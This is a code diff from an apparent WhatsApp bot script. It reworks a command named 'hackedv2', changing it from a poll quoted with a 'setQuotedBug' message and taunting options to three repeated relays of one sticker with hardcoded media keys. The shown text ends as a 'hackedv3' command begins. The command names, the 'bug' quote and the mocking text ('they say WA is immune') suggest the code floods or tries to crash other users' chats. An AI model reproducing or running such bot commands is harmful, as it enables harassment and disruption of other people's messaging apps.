@@ -605,34 +605,56 @@ xinn.sendMessage(from, { delete: {
 break
 
 case 'hackedv2':
-{
-var bugreact = await xinn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: m.id } } })
-var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
-"pollCreationMessage": {
-"name": "HALO DEKK 🥶", 
-"options": [
-   {
-"optionName": "VOTE YUK"
-   }, 
-   {
-"optionName": "BERANI VOTE GK"
-   }, 
-   {
-"optionName": "VOTE LAH SEMUA"
-   }, 
-   {
-"optionName": "KATANYA WA KEBAL"
-   }, 
-   {
-"optionName": "SALAM CREATOR BOT"
-   }
-], 
-"selectableOptionsCount": 5
-  }
-}), { userJid: from, quoted: setQuotedBug })
-xinn.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
-xinn.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
+ var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "7774",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": false,
 }
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+
+ var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "7774",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": false,
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+
+ var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "7774",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": false,
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 break
 case 'hackedv3':
 var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
